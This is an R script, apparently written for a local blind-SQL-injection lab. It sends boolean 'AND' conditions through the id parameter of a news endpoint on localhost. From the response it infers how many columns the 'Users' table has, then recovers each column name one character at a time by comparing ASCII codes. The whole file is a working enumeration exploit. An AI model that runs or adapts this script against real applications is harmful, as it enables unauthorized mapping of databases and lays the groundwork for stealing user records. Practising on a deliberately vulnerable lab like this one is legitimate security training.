#script2.R
library(httr)

# Configuración de la URL base
base_url <- "http://localhost:44367/News/NewsBlindSqlInjection?id="

# Función para verificar si la condición es verdadera
is_true <- function(query) {
  url <- paste0(base_url, URLencode(paste0("1 AND ", query)))
  response <- GET(url)
  content <- content(response, "text", encoding = "UTF-8")
  return(!grepl("No se encontraron noticias", content)) # Verificar si no hay error
}

# Función para contar el número de columnas en la tabla
count_columns <- function(table_name) {
  column_count <- 0
  repeat {
    query <- sprintf(
      "(SELECT COUNT(*) FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME = '%s') > %d",
      table_name, column_count
    )
    if (!is_true(query)) {
      break
    }
    column_count <- column_count + 1
  }
  return(column_count)
}

# Función para extraer el nombre de una columna específica
extract_column_name <- function(table_name, column_index) {
  column_name <- ""
  for (pos in 1:9) { # Hasta 9 letras en el nombre
    char_found <- FALSE
    for (ascii_code in c(65:90, 97:122)) { # Letras A-Z y a-z
      query <- sprintf(
        "ASCII(SUBSTRING((SELECT COLUMN_NAME FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME = '%s' ORDER BY COLUMN_NAME OFFSET %d ROWS FETCH NEXT 1 ROWS ONLY), %d, 1)) = %d",
        table_name, column_index, pos, ascii_code
      )
      if (is_true(query)) {
        column_name <- paste0(column_name, intToUtf8(ascii_code))
        char_found <- TRUE
        break
      }
    }
    if (!char_found) break # No hay más caracteres en el nombre
  }
  return(column_name)
}

# Función para listar todas las columnas de una tabla
list_columns <- function(table_name) {
  column_count <- count_columns(table_name)
  column_names <- c()
  for (i in 0:(column_count - 1)) {
    message(sprintf("Extrayendo columna %d de la tabla '%s'...", i + 1, table_name))
    column_name <- extract_column_name(table_name, i)
    column_names <- c(column_names, column_name)
  }
  return(column_names)
}

# Ejecutar el script
message("Iniciando extracción de columnas de la tabla 'Users'...")
columns <- list_columns("Users")

# Mostrar los nombres de las columnas
print("Columnas encontradas:")
print(columns)
